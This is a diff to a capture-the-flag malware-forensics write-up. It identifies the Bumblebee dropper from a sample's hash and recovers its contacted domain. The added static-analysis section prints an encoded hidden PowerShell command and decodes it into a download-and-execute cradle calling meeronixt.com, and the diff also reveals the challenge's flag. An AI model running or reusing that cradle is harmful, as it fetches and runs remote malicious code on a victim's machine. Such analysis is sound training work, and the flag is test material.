@@ -11,11 +11,44 @@ TLP:GREEN/PAP:AMBER
 Format : **HERO{Dropper Name;domain}**
 Example : HERO{Dropper;abcd.ef}
 
-## Write-up
+## Solve
+
+
+To find the name of the famous dropper,you can search by:
+
+* the name of the file ( bad idea but it's a CTF so soon or later someone would have push the file with the name I gave on any sandbox/virustotal )
+
+* the hash of the .iso, or the .lnk (recommended way )
 
 ```
-strings monthly-report-S3-2024.iso
+$ sha256sum monthly-report-S3-2024.iso 
+b824715290b48f5eaea19954e7d8825110dd6bfc99158154a4b1452ce1b3b860  monthly-report-S3-2024.iso
+```
 
+​	
+
+* on google 
+
+![image-20241027205948369](./asset/image-20241027205948369.png)
+
+First page name in the link
+
+* Search the hash in malware sample public database like malware bazaar
+
+https://bazaar.abuse.ch/browse.php?search=sha256%3Ab824715290b48f5eaea19954e7d8825110dd6bfc99158154a4b1452ce1b3b860
+
+![image-20241027210613024](./asset/image-20241027210613024.png)
+
+**Dropper name** => Bumblebee
+
+Then, to understand which domain is contacted, you can proceed either staticaly, either dynamicaly ( in a sandbox!!! )
+
+Static analysis :
+
+
+```
+$ strings monthly-report-S3-2024.iso
+[some garbage]
 ...
 @echo off
 :drzclsxvupw
@@ -80,14 +113,24 @@ set ojuvcf=g
 Desofuscation:
 
 ```
-$ sha256sum
-
+powershell -w hidden -nop -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AbQBlAGUAcgBvAG4AaQB4AHQALgBjAG8AbQAvAGcAYQB0AGUAIgApAA==
 ```
 
-Remote ressources: meeronixt.com
+```
+$ echo -n "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AbQBlAGUAcgBvAG4AaQB4AHQALgBjAG8AbQAvAGcAYQB0AGUAIgApAA==" | base64 -d
+IEX (New-Object Net.Webclient).downloadstring("http://meeronixt.com/gate")
+```
+
+Dynamic analysis: 
+
+public report :  (https://any.run/report/b824715290b48f5eaea19954e7d8825110dd6bfc99158154a4b1452ce1b3b860/6a6ae9e1-f1ff-46dd-b6ef-2ebe849fea9e) 
 
 
-flag : HERO{lnk;meeronixt.com}
+
+**Remote ressources**  => meeronixt.com
+
+
+flag : HERO{Bumblebee;meeronixt.com}
 
 
 ## Ressources 
